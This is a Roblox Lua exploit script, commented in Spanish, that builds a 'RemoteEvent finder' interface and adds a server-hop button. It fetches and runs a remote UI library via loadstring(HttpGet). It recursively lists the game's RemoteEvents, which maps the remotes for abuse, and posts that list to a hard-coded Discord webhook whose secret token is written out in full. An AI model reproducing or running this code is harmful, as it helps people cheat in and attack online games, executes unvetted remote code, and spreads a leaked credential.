-- Librerías
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

-- Configuración del Webhook
local WEBHOOK = "https://discord.com/api/webhooks/1395188329598681330/2c5dZncIV-4rNouI7XDUVXb4yCFNIYNM3wbv3op2IPyGBcIlnZ9SG5RfBv-RBM9MNor-"

-- UI
local Window = Library.CreateLib("Finder de RemoteEvents", "BloodTheme")
local tabEventos = Window:NewTab("RemoteEvents")
local secEventos = tabEventos:NewSection("Listar y Enviar")

local tabExtras = Window:NewTab("Extras")
local secExtras = tabExtras:NewSection("Utilidades")

-- 🧠 Función para obtener todos los RemoteEvents
local function obtenerRemoteEventsDesde(instancia, ruta)
    local eventos = {}

    for _, hijo in ipairs(instancia:GetChildren()) do
        local nuevaRuta = ruta .. "." .. hijo.Name
        if hijo:IsA("RemoteEvent") then
            table.insert(eventos, nuevaRuta)
        elseif #hijo:GetChildren() > 0 then
            local subEventos = obtenerRemoteEventsDesde(hijo, nuevaRuta)
            for _, e in ipairs(subEventos) do
                table.insert(eventos, e)
            end
        end
    end

    return eventos
end

-- 📤 Enviar RemoteEvents al Webhook
local function enviarRemoteEvents()
    local eventos = obtenerRemoteEventsDesde(game.ReplicatedStorage, "ReplicatedStorage")

    local contenido = table.concat(eventos, "\n")
    local data = {
        username = "RemoteEvent Finder",
        content = "📡 Lista de RemoteEvents detectados:\n```lua\n" .. contenido .. "\n```"
    }

    local jsonData = HttpService:JSONEncode(data)

    local success, err = pcall(function()
        HttpService:PostAsync(WEBHOOK, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("✅ Dump enviado correctamente.")
    else
        warn("❌ Error al enviar Webhook:", err)
    end
end

-- Botón para listar y enviar eventos
secEventos:NewButton("📤 Enviar RemoteEvents", "Busca todos los RemoteEvents y los manda al Webhook", function()
    enviarRemoteEvents()
end)

-- 🔄 Botón para cambiar de servidor (azul)
secExtras:NewButton("🔄 TP a otro servidor", "Server hop", function()
    local gameId = game.PlaceId

    local servers = {}
    local req = game:HttpGet("https://games.roblox.com/v1/games/"..gameId.."/servers/Public?sortOrder=Asc&limit=100")
    local data = HttpService:JSONDecode(req)

    for _, server in ipairs(data.data) do
        if server.playing < server.maxPlayers and server.id ~= game.JobId then
            table.insert(servers, server.id)
        end
    end

    if #servers > 0 then
        TeleportService:TeleportToPlaceInstance(gameId, servers[1], Players.LocalPlayer)
    else
        warn("❌ No se encontraron servidores válidos.")
    end
end)
